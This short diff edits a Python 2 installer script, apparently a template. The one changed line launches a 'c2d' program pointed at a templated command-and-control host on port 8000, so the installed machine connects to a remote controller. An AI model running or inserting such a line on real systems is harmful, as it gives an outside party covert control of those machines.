@@ -20,6 +20,6 @@ if __name__ == "__main__":
     install(filename)
     print '[+] Install succesfull, configuring host'
     host = '{{hostname}}'.split(':')[0]
-    subprocess.call(['c2d', '--c2-host', '{{hostname}}', '--c2-port', '8000'])
+    subprocess.call(['c2d', '--c2-host', host, '--c2-port', '8000'])
 
 
